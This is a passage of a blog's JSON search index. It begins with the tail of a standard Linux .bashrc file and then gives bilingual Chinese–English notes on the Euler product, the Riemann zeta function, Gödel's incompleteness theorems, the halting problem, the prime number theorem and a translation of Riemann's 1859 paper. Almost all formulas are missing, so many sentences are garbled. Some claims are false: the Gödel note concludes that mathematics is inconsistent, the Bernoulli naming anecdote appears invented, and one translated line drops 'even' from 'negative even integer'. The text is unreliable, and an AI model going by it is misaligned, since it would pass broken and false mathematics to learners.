] &amp;&amp; eval \"$(SHELL=/bin/sh lesspipe)\"# set variable identifying the chroot you work in (used in the prompt below)if [ -z \"${debian_chroot:-}\" ] &amp;&amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot)fi# set a fancy prompt (non-color, unless we know we \"want\" color)case \"$TERM\" in xterm-color) color_prompt=yes;;esac# uncomment for a colored prompt, if the terminal has the capability; turned# off by default to not distract the user: the focus in a terminal window# should be on the output of commands, not on the promptforce_color_prompt=yesif [ -n \"$force_color_prompt\" ]; then if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then # We have color support; assume it's compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fifiif [ \"$color_prompt\" = yes ]; then PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;31m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ 'else PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ 'fiunset color_prompt force_color_prompt# If this is an xterm set the title to user@host:dircase \"$TERM\" inxterm*|rxvt*) PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\" ;;*) ;;esac# colored GCC warnings and errorsexport GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'# enable color support of ls and also add handy aliasesif [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors &amp;&amp; eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\" alias ls='ls --color=auto' alias dir='dir --color=auto' alias vdir='vdir --color=auto' alias grep='grep --color=auto' alias fgrep='fgrep --color=auto' alias egrep='egrep --color=auto'fi# some more ls aliasesalias ll='ls -l'alias la='ls -A'alias l='ls -la'# Alias definitions.# You may want to put all your additions into a separate file like# ~/.bash_aliases, instead of adding them here directly.# See /usr/share/doc/bash-doc/examples in the bash-doc package.if [ -f ~/.bash_aliases ]; then . ~/.bash_aliasesfi# enable programmable completion features (you don't need to enable# this, if it's already enabled in /etc/bash.bashrc and /etc/profile# sources /etc/bash.bashrc).if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fifi"},{"title":"","date":"2025-09-14T03:09:00.000Z","updated":"2025-09-14T05:47:00.000Z","comments":true,"path":"notes/Zeta/1.html","permalink":"https://blog.mhuig.top/notes/Zeta/1","excerpt":"","text":"Leibniz 莱布尼茨的手稿 汉诺威莱布尼茨文献馆存放了德国数学家戈特弗里德・威廉・莱布尼茨的手稿，其中包含了发明微积分符号 (Leibniz-13) 和发明二进制 (Leibniz-24) 的部分。 Leibniz-1 Leibniz-1 Leibniz-2 Leibniz-2 Leibniz-3 Leibniz-3 Leibniz-4 Leibniz-4 Leibniz-5 Leibniz-5 Leibniz-6 Leibniz-6 Leibniz-7 Leibniz-7 Leibniz-8 Leibniz-8 Leibniz-9 Leibniz-9 Leibniz-10 Leibniz-10 Leibniz-11 Leibniz-11 Leibniz-12 Leibniz-12 Leibniz-13 Leibniz-13 Leibniz-14 Leibniz-14 Leibniz-15 Leibniz-15 Leibniz-16 Leibniz-16 Leibniz-17 Leibniz-17 Leibniz-18 Leibniz-18 Leibniz-19 Leibniz-19 Leibniz-20 Leibniz-20 Leibniz-21 Leibniz-21 Leibniz-22 Leibniz-22 Leibniz-23 Leibniz-23 Leibniz-24 Leibniz-24 Leibniz-25 Leibniz-25 Leibniz-26 Leibniz-26 Leibniz-27 Leibniz-27 Leibniz-28 Leibniz-28 Leibniz-29 Leibniz-29"},{"title":"","date":"2025-09-15T02:28:00.000Z","updated":"2025-09-15T02:30:00.000Z","comments":true,"path":"notes/Zeta/10.html","permalink":"https://blog.mhuig.top/notes/Zeta/10","excerpt":"","text":"埃拉托斯特尼筛法 埃拉托斯特尼筛法 The Greek mathematician Eratosthenes proposed a simple algorithm for identifying prime numbers. To obtain all prime numbers less than or equal to a natural number , one must eliminate all multiples of prime numbers not greater than , and the remaining numbers will be prime. 希腊数学家埃拉托斯特尼所提出一种简单检定素数的算法。要得到自然数 以内的全部素数，必须把不大于 的所有素数的倍数剔除，剩下的就是素数。 Next, I will manually demonstrate how to obtain all the prime numbers within a certain range. 下面我将手动演示如何获得某个区间的所有素数。 Write integers of about . 写出大约 的整数。 Leaving unchanged, remove all the numbers in the number table that are multiples of to get: 保持 不变，删掉所有 的倍数，得到： The first number after is . Keep and unchanged, and remove all the numbers in the number table that are multiples of to get: 之后的第一个数字是 ，保持 和 不变，删掉所有 的倍数，得到： The first unaffected number after is . Leaving , , and unchanged, and discarding all multiples of in the number table, we get: 之后的第一个不受影响的数字是 ，保持 , , 不变，删掉所有 的倍数，得到： The first number not affected is . The next step is to leave , , , unchanged, and eliminate all the numbers in the table that are multiples of . 之后的第一个不受影响的数字是 ，保持 , , , 不变，删掉所有 的倍数。 ………… The last remaining numbers are prime numbers. 最后剩下的数字是素数。 This is the Sieve of Eratosthenes. 这是埃拉托斯特尼筛法。"},{"title":"","date":"2025-09-15T02:40:00.000Z","updated":"2025-09-15T02:43:00.000Z","comments":true,"path":"notes/Zeta/11.html","permalink":"https://blog.mhuig.top/notes/Zeta/11","excerpt":"","text":"Euler 对无穷级数的若干观察 Euler 对无穷级数的若干观察 Variae observationes circa series infinitas de en"},{"title":"","date":"2025-09-15T03:11:00.000Z","updated":"2025-10-07T05:30:00.000Z","comments":true,"path":"notes/Zeta/12.html","permalink":"https://blog.mhuig.top/notes/Zeta/12","excerpt":"","text":"欧拉乘积公式 欧拉乘积公式 欧拉乘积公式Bernoulli discovered Bernoulli numbers, which were originally used to solve the summation problem of equal powers. 伯努利发现了伯努利数，这些数最初是用于解决等幂和问题的。 The sum to equal powers problem refers to the formula for finding . “等幂和问题” 指的是用于计算 的公式。 Euler modified the above formula to become this zeta function: 伯努利的学生欧拉对上述公式进行了修改，从而得出了这个 Zeta 函数： Let's try to apply The Sieve of Eratosthenes mentioned earlier to the zeta function. 让我们尝试将之前提到的埃拉托斯特尼筛法应用到 Zeta 函数中。 Multiply both sides of the equation by : 将方程 两边同时乘以 ： Subtract expression from expression to get: 用表达式 减去表达式 ，得到： So the right-hand side of the equation cancels out all the multiples of 2. 因此，等式右边的所有 2 的倍数都相互抵消了。 Review The Sieve of Eratosthenes. 回顾埃拉托色尼筛法。 Multiply both sides of the equation by , denoted : 将方程两边同时乘以 ： All the multiples of 3 disappear. The first number on the right becomes 5. Continue to get: 所有 3 的倍数都消失了。右边的第一个数字变为 5。接着继续得到： Do you notice that this is similar to The Sieve of Eratosthenes? 你有没有注意到这与埃拉托色尼筛法类似呢？ In fact, the difference should be noticed first. 事实上，首先应当注意到的是这种差异。 In the Sieve of Eratosthenes, leave unchanged and subtract their integer multiples in turn. 在埃拉托斯特尼筛法中，将 这些数保持不变，然后依次减去它们的整数倍。 Now, we have removed the original prime ( ) and all its multiples from the right. 现在，我们已经将原始的质数（ ）及其所有倍数从右侧移除掉了。 If you go all the way down to a larger prime number, such as 997, you get: 如果一直向下继续找更大的质数，比如 997，那么结果就是： If you repeat this process over and over again, you get the following results: 如果你不断重复这个过程，就会得到以下结果： Divide both sides of the above formula repeatedly by each bracketed term in turn to get: 依次对上述公式两边的每个括号内的项进行除法运算，即可得到： Now all that's left of this equation is something to do with prime numbers. 现在这个等式剩下的部分就与质数有关了。 To wit: 即： The above formula is called Euler product formula. 上述公式被称为 “欧拉乘积公式”。 It's easy to see that this thing is related to prime numbers, and a bunch of products of prime numbers on the right can be converted into a bunch of summations of natural numbers on the left, which is more like a bridge to build a wonderful connection. 不难看出，这个式子与质数有关，而右边一系列的质数乘积可以转换为左边一系列的自然数求和，这就好像是搭建起一座桥梁，从而建立起一种美妙的联系。 Euler used this formula to prove that the number of prime numbers is infinite and ran away happily. 欧拉利用这个公式证明了质数的数量是无限的，然后就鸣金收兵了。 Later Riemann studied the Zeta function in detail, giving a paper \"On the Number of Primes Less Than a Given Magnitude\". In honor of Riemann's work, this function is called Riemann Zeta function. 后来，黎曼对 Zeta 函数进行了深入研究，并发表了一篇题为《论小于给定数值的素数个数》的论文。为了纪念黎曼的这一研究成果，这个函数被称为黎曼 Zeta 函数。 广义欧拉乘积公式设 为积性函数（即 对 成立），且级数 收敛，则 其中乘积遍历所有素数 。 核心条件： 积性： 对互素 成立，确保素数分解的唯一性可转化为乘积结构。 绝对收敛： ，保证无穷乘积与级数的交换性合法。 证明有限乘积展开： 对 ，考虑部分乘积 由乘性和算术基本定理， 等于所有素因子 的自然数 的 之和，即 ，其中 素因子 。 误差项估计： 记 ，其中余项 。由于 ，对任意 ，存在 使得 对 成立。 极限过程： 令 ，则 覆盖所有自然数， ，故"},{"title":"","date":"2025-09-15T08:11:00.000Z","updated":"2025-10-07T05:19:00.000Z","comments":true,"path":"notes/Zeta/13.html","permalink":"https://blog.mhuig.top/notes/Zeta/13","excerpt":"","text":"牛顿广义二项式定理 牛顿广义二项式定理 我们先来看一个无穷和： 利用暴力计算的手段可以计算出一些值 , , …… 发散 发散 ……… 我们通过代值观察发现只有当 的定义在 时， 是收敛的。 我们把这个无穷和改写成这样 现在括号中的那个级数恰好是 . 换句话说： 立即得出 隐藏在这个无穷和背后的是这个简单的 吗？ 通过简单的代值观察发现确实是这样。这个式子是成立的。 但他们并非一回事，因为他们有不同的定义域。 原本的 只有在 上才有值，而 只要 不为 就有函数值。 这件事的意义是：一个无穷级数可能仅在一个函数的部分定义域上定义了这个函数。这个函数的其余部分隐藏在某个地方，等待被某种技巧发现。 这引起了一个问题： Zeta 函数也是这样吗？ 我们将上式两边同时积分，得到 当 时 只有当你把式中各项按照这个顺序相加的时候它才收敛到 ，如果改变相加的顺序它会收敛到其他值或者不收敛。这被称为条件收敛。 如果改变相加的顺序收敛值不变。这被称为绝对收敛。 杨辉三角对于二项式展开，我们有经典的二项式定理。对于正整数 其中 ，就是杨辉三角里的数字。 牛顿的推广：从整数幂到任意指数杨辉三角和二项式定理解决的是： ，其中 是整数。 但是，牛顿提出了一个大胆的问题：如果指数不是整数呢？ 比如 或 ，还能不能展开？ 大约在 1664-1665 年 (1666 是牛顿奇迹年），牛顿发现，只要把组合数的公式 稍微改写，用实数 代替整数 ，公式（后来被证明可进一步推广到复数）也成立： 于是，广义二项式定理就来了： （当 时收敛）。例如： 平方根展开： 倒数展开： 这些无穷级数可以用来近似计算数值，非常实用. 牛顿的广义二项式展开就是最早的幂级数展开之一。它启发了后来泰勒公式：任何解析函数在某点附近都可以展开成无穷级数。从 出发，人们意识到：不仅幂函数，其他函数（指数、三角、对数）也能展开。这是微积分与数学分析的基石。 欧拉把二项式展开自然推广到复数域： 这成为了复分析中最早的幂级数表示之一，后来发展出解析函数理论和解析延拓。 Zeta 函数的解析延拓 From ZhiHu-TravorLZH Zeta 函数 的原先定义域仅仅在 ，然而利用 Dirichlet eta 函数 ，我们可以通过 将其定义域拓展至 剩下的工作就是将它的定义域拓展到除 之外的全平面了。方法一：Poisson 求和公式 + 搞积 + Gamma定义 则可以通过各种性质，得：利用高斯函数的 Fourier 变换 以及 Poisson 求和公式可得：通过对 式左侧运用 和搞积技巧，可得：可以发现 式右侧把 变成 时结果依然相同，意味着通过对 进行移项、运用余元公式和勒让德倍元公式，可得 Zeta 函数的函数方程：至此我们就将 Zeta 函数延拓到了 。现在介绍第二种方法方法二：围道积分 + 放缩 + 乱炖考虑积分 ，其中围道如下：计算每一段路径，可得：现在考虑另一个围道积分 ，其中 如下图：通过对 运用留数定理，得到：可以通过放缩等乱炖技巧证明 。因此结合 ，有：于是我们又一次发现了 Zeta 函数的函数方程。综上所述，黎曼 zeta 函数的完整定义为："},{"title":"","date":"2025-09-15T12:17:00.000Z","updated":"2025-09-15T12:20:00.000Z","comments":true,"path":"notes/Zeta/14.html","permalink":"https://blog.mhuig.top/notes/Zeta/14","excerpt":"","text":"二年级之梦 二年级之梦 二年级之梦二年级之梦 (sophomore's dream) 是指微积分中的一个看似不正确, 但实际上正确的等式，由约翰・伯努利于 1697 年发现的有趣的数学恒等式。 它的近似值是 1697 年欧拉的老师约翰・伯努利思考这个问题，那时候他的大儿子刚出生没多久，他请了假在家中带娃。所以，就在一个闲极无聊的夏日，他在清凉的树荫之下，一边带娃，一边在纸上写写画画，最终他写下了这么一个等式。在有了左边的级数之后，我们就能无限逼近右边的积分的精确值。约翰・伯努利很是开心，于是对着他两岁的儿子说：小伙子啊，我们就把这个积分叫做二年级之梦吧。 这个公式的命名与一年级之梦相对应,一年级之梦是指不正确的等式 . 证明注意到 并且这个幂级数关于 一致收敛, 从而 左边右边 其中倒数第二行利用了 Gamma 函数的定义. 伽马函数发展史伽马函数（Gamma function）的发现可追溯至 1729 年，由瑞士数学家 莱昂哈德・欧拉（Leonhard Euler） 首次提出并解决。 关键时间节点 1728 年： 数学家 哥德巴赫（Christian Goldbach） 提出阶乘的插值问题（即如何将阶乘推广到非整数域），并向尼古拉斯・伯努利（Nicolaus Bernoulli）及其弟丹尼尔・伯努利（Daniel Bernoulli）寻求解答，但未获解决。 1729 年： 时年 22 岁的欧拉在丹尼尔・伯努利的启发下，成功解决了阶乘插值问题，首次推导出伽马函数的雏形。 他通过积分形式给出了阶乘在实数域的推广表达式，即伽马函数的核心定义： 这一成果标志着伽马函数的诞生。 1730 年： 欧拉在致哥德巴赫的信件中进一步完善了伽马函数的积分形式，并明确了其与阶乘的关系 。 补充说明名称的由来： “伽马函数” 这一名称并非欧拉原创，而是由法国数学家阿德里安 - 马里・勒让德（Adrien-Marie Legendre） 在 19 世纪命名。 历史意义： 欧拉的发现不仅解决了阶乘的解析延拓问题，还为后续复分析、概率论（如伽马分布）及数论的发展奠定了基础。 函数定义的演变： 欧拉最初使用的是极限形式的定义（ ），现代常用的积分形式是其后期推广的结果。 结论伽马函数的核心发现年份为 1729 年，由欧拉完成。这一成果是 18 世纪分析学的里程碑之一，开启了特殊函数理论的研究浪潮。 1697 年伯努利凭借自己强大的注意力和想象力，直接写下了这个式子，后来被证明是正确的。伯努利确实是一个天才。"},{"title":"","date":"2025-09-19T07:35:00.000Z","updated":"2025-09-19T08:16:00.000Z","comments":true,"path":"notes/Zeta/15.html","permalink":"https://blog.mhuig.top/notes/Zeta/15","excerpt":"","text":"罗素悖论 罗素悖论 罗素悖论是由罗素发现的一个朴素集合论的悖论，其基本思想是：对于任意一个集合 ， 要么是自身的元素，即 ； 要么不是自身的元素，即 。 根据康托尔集合论的概括原则，可将所有不是自身元素的集合构成一个集合 现在问题来了，是 ，还是 ？ 如果 ，那么根据 的定义 ，推出 。 如果 ，那么根据 的定义 ，推出 。 也就是说 通俗的版本：一个只为不给自己理发的人理发的理发师应不应该给自己理发？ 一个理发师公布了他的原则：他只为不给自己理发的人理发。那么这个理发师应不应该给自己理发？ 如果他给自己理发，按照他的原则，他就不能给自己理发。 如果他不给自己理发，按照他的原则，他就能给自己理发。 那么理发师应不应该给自己理发？"},{"title":"","date":"2025-09-19T10:35:00.000Z","updated":"2025-09-20T00:16:00.000Z","comments":true,"path":"notes/Zeta/16.html","permalink":"https://blog.mhuig.top/notes/Zeta/16","excerpt":"","text":"哥德尔不完备性定理 哥德尔不完备性定理 哥德尔数我们这里构造一种对应关系，把数学中所有的东西都映射到某个数，称为 \"哥德尔数\"。 这样我们可以把关于数学性质的讨论，变成关于数的性质的讨论。 数学中最基础的是符号。首先，我们定义 个最基本的数学符号，并为他们分配 的哥德尔数。 , , 之类的字母的哥德尔数规定为 ， ， 等后面的质数。 基本数学符号 含义 哥德尔数 非 1 或 2 如果… 那么… 3 存在 4 等号 5 零 6 后继 7 左括号 8 右括号 9 逗号 10 加号 11 乘号 12 字母 13 字母 17 字母 19 其他变量 其他变量 后续质数 在我们今天讨论的自然数范围内，这 个符号加上字母基本上能够表达一切了。 比如 \"皮亚诺算术公理\" 序号 皮亚诺算术公理 含义 (1) 存在自然数 (2) 存在自然数 是自然数 的后继数 (3) 不是任何自然数的后继数 (4) 对自然数 , ,若 , 的后继数相等，则 , 相等 后继的数是指后面的数，比如 是 的后继， 表达为 , 就是 ， 就是 依此类推… 到此为止，基本的符号和数字都有了自己的哥德尔数。数字和符号的序列可以构成命题。比如 是一个命题。这五个符号对应的哥德尔数分别是 。 命题转化成哥德尔数如何把命题转化成哥德尔数呢？ 我们的方法是写出前几个质数 ，把五个符号的哥德尔数放到它的指数位置然后再相乘 这样命题 的哥德尔数就是 约等于 亿亿亿。 可以看出命题的哥德尔数都很大。我们小学二年级都学过质因数分解。算术分解定理： 每个大于 的自然数，要么本身就是质数，要么可以写为两个或以上的质数的积，而且这些质因子按照从小到大排列之后，写法只有一种方式。 一个整数的质因数分解方式是唯一的。 所以这种方法保证了每个命题都可以对应到唯一的哥德尔数。而你看到一个哥德尔数，也可以通过质因数分解找到它对应的命题。 到目前为止，所有的命题都有了自己对应的哥德尔数。命题序列可以构成证明过程。 比如如何证明 是存在的？ 根据皮亚诺公理，每个自然数都存在后继数，因此 的后继 存在。 写出来就是因为 所以 写成哥德尔数就是因为 ，所以 。 这两个命题的哥德尔数分别是 和 分别记为 和 。 计算证明过程的哥德尔数： 到目前为止，所有的证明过程都有了自己的哥德尔数。 复杂的命题转化成哥德尔数命题：质数有无穷多个。 等价于：不存在最大的质数。 即： 最大的质数 即: 是质数，且是质数， 存在和任意的转化 存在 不满足条件 等价于非任意 满足条件 不存在 满足条件 等价于任意 均不满足条件 . 等价于 是质数（是质数 质数：没有除 和自身外的因数。 即： 大于 : 小于 : 且 : 现在命题质数有无穷多个可以用基本数学符号来表达了。然后就可以算哥德尔数了。 讨论命题的命题转化成哥德尔数甚至可以把一个讨论命题的命题也变成哥德尔数。 命题： 等价于 对应哥德尔数： 哥德尔数： 讨论命题的命题： 的第二个符号是加号 等价于： 命题 的哥德尔数 (G) 能被 整除，却不能被 整除。 等价于： 无法证明的命题转化成哥德尔数 元数学的 “不可证” 断言，等价于一个关于自然数关系的否定性存在命题。 命题： 哥德巴赫猜想无法证明。 等价于： 没有一个证明过程以哥德巴赫猜想收尾。 即： 不存在一个 步的证明过程使得它的哥德尔数能被 第个质数哥德巴赫猜想的哥德尔数 整除。 总之，各种命题，甚至是讨论命题的命题，无论真假都可以用哥德尔数表示。 函数 sub (a,b,c)命题： 哥德尔数： 记为 用 替换 得到一个新命题： 我们定义一个特殊的函数 sub (a,b,c)： 取哥德尔数为 的命题，找到命题中哥德尔数为 的符号的位置，把它替换成数字 ，得到的新命题的哥德尔数就是 sub (a,b,c)。 sub (m,m,17) 的命题： 取哥德尔数是 的命题，也就是 。 找到命题中哥德尔数为 的符号的位置， 也就是符号 的位置。 把它替换成 。 得到的这个新命题就是 。 也就是说：命题 的哥德尔数就是 sub (m,m,17)。 \"无法证明哥德尔数是 sub (n,n,17) 的命题\" 的哥德尔数是 sub (n,n,17)命题 a： 无法证明哥德尔数是 sub (y,y,17) 的命题。 哥德尔数： 记为 。 那这个哥德尔数是 sub (y,y,17) 的命题是什么呢？ 取哥德尔数是 的命题，找到命题的哥德尔数是 的符号，也就是符号 的位置，把它替换成 ，所得到的命题的哥德尔数是 sub (y,y,17)。 命题 b： 无法证明哥德尔数是 sub (n,n,17) 的命题。 那这个哥德尔数是 sub (n,n,17) 的命题是什么呢？ 取哥德尔数是 的命题，也就是命题 a，找到命题的哥德尔数是 的符号，也就是符号 的位置，把它替换成 ，所得到的命题（刚好就是命题 b）的哥德尔数是 sub (n,n,17)。 也就是说：命题 b 的哥德尔数就是 sub (n,n,17)。 \"无法证明哥德尔数是 sub (n,n,17) 的命题\" 的哥德尔数是 sub (n,n,17)。 这个命题刚好说的就是自己是无法证明的。 \"无法证明哥德尔数是 sub (n,n,17) 的命题\" 是真命题反证法： 假设 \"无法证明哥德尔数是 sub (n,n,17) 的命题\" 是假命题。 立即得出（反命题是真命题）： \"可以证明哥德尔数是 sub (n,n,17) 的命题\" 是真命题。 推出（可以证明是真的那么一定是真命题）： \"哥德尔数是 sub (n,n,17) 的命题\" 是真命题。 由于 \"无法证明哥德尔数是 sub (n,n,17) 的命题\" 的哥德尔数是 sub (n,n,17)，所以推出： \"无法证明哥德尔数是 sub (n,n,17) 的命题\" 是真命题。 这与假设矛盾，如果承认数学公理体系具有一致性则假设不成立。 \"无法证明哥德尔数是 sub (n,n,17) 的命题\" 是真命题。 也就是说： \"哥德尔数是 sub (n,n,17) 的命题\" 是无法证明的真命题。 哥德尔第一不完备性定理任何一个包含了足够强的算术公理的形式化系统，如果是一致的，就是不完备的。即其中必须存在一些既不能证明，也不能证否的命题。 哥德尔第二不完备性定理任何一个包含了足够强的算术公理的形式化系统，其一致性不能在内部得到证明。 我们假设数学公理体系具有一致性，推出了 \"哥德尔数是 sub (n,n,17) 的命题\" 是真的且无法证明。也就是说我们证明哥德尔数是 sub (n,n,17) 的命题为真用到的唯一条件就是假设数学公理体系是一致的。但哥德尔第一不完备性定理告诉我们哥德尔数是 sub (n,n,17) 的命题是不能证明的，这与我们已经证明出了 \"哥德尔数是 sub (n,n,17) 的命题\" 矛盾。所以数学公理体系不具有一致性。 已知的 sub (n,n,17)克鲁斯卡树定理 帕里斯 - 哈林顿定理 金森 - 麦卡隆定理 古德斯坦定理"},{"title":"","date":"2025-09-20T07:35:00.000Z","updated":"2025-09-20T07:55:00.000Z","comments":true,"path":"notes/Zeta/17.html","permalink":"https://blog.mhuig.top/notes/Zeta/17","excerpt":"","text":"停机问题 停机问题 停机问题（Halting Problem）是逻辑数学中可计算性理论的一个问题。通俗地说，停机问题就是判断任意一个程序是否能在有限的时间之内结束运行的问题。 该问题等价于如下的判定问题：是否存在一个程序 ，对于任意输入的程序 ，能够判断 会在有限时间内结束 (Halt) 或者死循环 (Loop)。 图灵机图灵机是艾伦・图灵（Alan Turing）于 1936 年提出的抽象计算模型，用于精确定义 “可计算性”。其核心组成包括： 无限长纸带：划分为单元格，存储符号（如 0 / 1）。 读写头：读取 / 修改当前单元格内容，并左右移动。 状态寄存器：记录当前状态（如开始、接受、拒绝状态）。 转移规则表：基于当前状态和读取的符号，决定下一步操作（写符号、移动方向、状态变更）。 图灵的证明图灵通过反证法证明停机问题不可解： 假设存在判定程序 H (P, I)： 输入程序 和输入 ， 输出 “停机”(Halt) 或 “不停机”(Loop)。 构造自指悖论程序 D (I)： 的行为与 的预测相反： 若 输出 “停机”(Halt)，则 无限循环 (Loop)； 若 输出 “不停机”(Loop)，则 立即停机 (Halt)。 矛盾产生： 若 判断 停机 (Halt) → 实际无限循环 (Loop) [矛盾]； 若 判断 不停机 (Loop) → 实际停机 (Halt) [矛盾]。 故假设不成立，不存在通用的 。"},{"title":"","date":"2025-09-22T02:35:00.000Z","updated":"2025-09-22T02:55:00.000Z","comments":true,"path":"notes/Zeta/18.html","permalink":"https://blog.mhuig.top/notes/Zeta/18","excerpt":"","text":"素数定理 素数定理 素数定理：数学中的 “素数分布密码”素数（质数），那些只能被 1 和自身整除的数字（如 ），在整数中的分布看似杂乱无章，却隐藏着深刻的规律。素数定理（Prime Number Theorem, PNT）正是揭示这一规律的里程碑，它指出：当 趋向无穷大时，小于 的素数个数 渐近于 。用数学语言表述为： 当 其中 是素数计数函数（表示不超过 的素数个数）， 是自然对数，符号 表示渐近等价。更进一步，定理可强化为： 这里 （对数积分）比 给出了更精确的逼近。 定理的核心内涵 渐近的本质 素数定理描述的是大尺度统计规律，而非精确公式。例如： 当 时，实际 ，而 （相对误差约 7.8% ）。 当 时， , （误差降至约 3.8% ）。 误差随 增大而减小，最终在极限下消失。 黎曼猜想的影响 若黎曼猜想成立，素数定理的精度将大幅提升： 对足够大的 这一联系凸显了 PNT 在解析数论中的核心地位。 历史故事：猜想、竞争与突破天才少年的洞察（1792 年）高斯（Carl Friedrich Gauss）在 15 岁时，通过研究素数表发现：素数密度约为 。他在笔记本中写道：“素数分布问题或许与对数积分有关。” 但高斯未曾公开发表此猜想，仅在信件中提及。 优先权之争 (1808 年)勒让德（Adrien-Marie Legendre）在专著中明确提出猜想： 。尽管公式不如高斯优雅，但这是首次公开猜想。两人曾因此产生优先权争议，后世将荣誉归于高斯。 关键桥梁：切比雪夫不等式（1850 年）俄罗斯数学家切比雪夫（Pafnuty Chebyshev）首次为素数定理注入严格数学工具。他证明： 此不等式虽未证实渐近性，却首次量化了上下界。 黎曼的遗产（1859 年）黎曼（Bernhard Riemann）在著名论文《论小于给定值的素数个数》中，提出 函数（zeta function）与素数的深层关联： 他将 表达为 函数非平凡零点（ ）的和, 这一洞见最终导向证明的核心。 双重突破（1896 年）法国数学家阿达马（Jacques Hadamard）和比利时学者德・拉・瓦莱・普桑（Charles de la Vallée Poussin）独立完成证明。他们基于 函数在直线 上无零点这一关键结论，构建了复分析框架下的证明。两人论文仅隔数月发表，共享历史荣耀。"},{"title":"","date":"2025-09-20T02:38:00.000Z","updated":"2025-09-20T02:56:00.000Z","comments":true,"path":"notes/Zeta/19.html","permalink":"https://blog.mhuig.top/notes/Zeta/19","excerpt":"","text":"对数运算法则 对数运算法则 基本运算法则设 , , , , : 积法则 商法则 幂法则 换底公式换底公式 ( , ) 常用推论倒数关系： 指数转移： 链式法则： 。 哲学思考：加法和乘法的联系加法代表同维度的线性思维，乘法代表维度跃迁的非线性关系。 加法是同一维度内的累积（如数量叠加），而乘法是跨维度的相互作用（如质量 = 体积 × 密度），其结果涌现出新属性。 对数是连接加法和乘法的桥梁。 这揭示了数学运算层级间的深刻统一性，其本质是通过抽象映射实现复杂性的降维。 对数不仅是算术技巧，更是人类理性为复杂宇宙构建的 “认知之桥”—— 它证明：乘法世界的混沌，总能在加法世界找到有序的投影。 \"你若想继续知道宇宙的秘密，必须留意 “+” 和 “×” 这两个十字架符号。\""},{"title":"","date":"2025-09-14T03:09:00.000Z","updated":"2025-11-09T05:47:00.000Z","comments":true,"path":"notes/Zeta/2.html","permalink":"https://blog.mhuig.top/notes/Zeta/2","excerpt":"","text":"On the Number of Primes Less Than a Given Magnitude On the Number of Primes Less Than a Given Magnitude Ueber die Anzahl der Primzahlen unter einer gegebenen Grösse On the Number of Primes Less Than a Given Magnitude 论小于给定大小的素数个数 by BERNHARD RIEMANN 作者：波恩哈德・黎曼 Meinen Dank für die Auszeichnung, welche mir die Akademie durch die Aufnahme unter ihre Correspondenten hat zu Theil werden lassen, glaube ich am besten dadurch zu erkennen zu geben, dass ich von der hierdurch erhaltenen Erlaubniss baldigst Gebrauch mache durch Mittheilung einer Untersuchung über die Häufigkeit der Primzahlen; ein Gegenstand, welcher durch die Interesse, welches Gauss und Dirichlet demselben längere Zeit geschenkt haben, einer solchen Mittheilung vielleicht nicht ganz unwerth erscheint. I believe I can best express my gratitude for the honor which the Academy has bestowed on me in naming me as one of its correspondents by immediately availing myself of the privilege this entails to communicate an investigation of the frequency of prime numbers, a subject which because of the interest shown in it by Gauss and Dirichlet over many years seems not wholly unworthy of such a communication. 我认为，对于贵院授予我的这一殊荣，即选我为贵院通讯院士，我最恰当的表达感激之情的方式，莫过于立即利用这一特权，向贵院呈交一篇关于素数分布频率的研究报告。由于高斯和狄利克雷多年来对此课题表现出浓厚兴趣，我认为这一研究并非完全不值得向贵院汇报。 Bei dieser Untersuchung diente mir als Ausgangspunkt die von Euler gemachte Bemerkung, dass das Product In this investigation I take as my starting point the observation of Euler that the product 在这项研究中，我以欧拉的观察作为起点，即乘积 wenn für alle Primzahlen, für alle ganzen Zahlen gesetzt werden. where ranges over all prime numbers and over all whole numbers. 其中， 取遍所有的质数，而 取遍所有的整数。 Die Function der complexen Veränderlichen , welche durch diese beiden Aus-drücke,so lange sie convergiren, dargestellt wird, bezeichne ich durch . The function of a complex variable which these two expressions define when they converge I denote by . 这两个表达式收敛时，所表示的复变量 的函数，我将其记为 。 Beide convergiren nur, so lange der reelle Theil von grösser als ist; es lässt sich indess leicht ein immer gültig bleibender Ausdruck der Function finden. They converge only when the real part of is greater than ; however, it is easy to find an expression of the function whichalways is valid. 只有当复数 的实部大于 时，两个表达式才会收敛；不过，很容易就能得出一个始终有效的函数表达式。 Durch Anwendung der Gleichung By applying the equation 由等式 erhält man zunächst one finds first 立即得出 Betrachtet man nun das Integral If one considers the integral 如果我们考虑围道积分 von bis positiv um ein Grössengebiet erstreckt, welches den Werth , aber keinen andern Unstetigkeitswerth der Function unter dem Integralzeichen im Innern enthält, so ergiebt sich dieses leicht gleich from to in the positive sense around the boundary of a domain which contains the value but no other singularity of the integrand in its interior, then it is easily seen to be equal to 其中积分路线沿一条闭路径按正方向从 到 ，这条路径内部包含 点但不包含被积函数的其他不连续的奇点，则很容易看出其结果等于 vorausgesetzt, dass in der vieldeutigen Function der Logarithmus von so bestimmt worden ist, dass er für ein negatives reell wird. provided that in the many-valued function the logarithm of is determined in such a way that it is real for negative values of . 假设在多值函数 中这样来取对数， 的对数的确定方式应使得当 为负值时该对数为实数。 Man hat daher Thus 由此得出 das Integral in der eben angegebenen Bedeutung verstanden. when the integral is defined as above. 此时的积分按照上述的意义来理解。 Diese Gleichung giebt nun den Werth der Function für jedes beliebige complexe und zeigt, dass sie einwerthig und für alle endlichen Werthe von ausser , endlich ist, so wie auch, dass sie verschwindet, wenn gleich einer negativen geraden Zahl ist. This equation gives the value of the function for all complex and shows that it is single-valued and finite for all values of other than , and also that it vanishes when is a negative even integer. 这个等式给出了函数 对于所有复数 上的值，并表明它是一个单值函数，除了 以外，对于每个有限的 该函数的值都是有限的，而且当 为负整数时，该函数会变为零。 Wenn der reelle Theil von negativ ist, kann das Integral, statt positiv um das angegebene Grössengebiet auch negativ um das Grössengebiet, welches 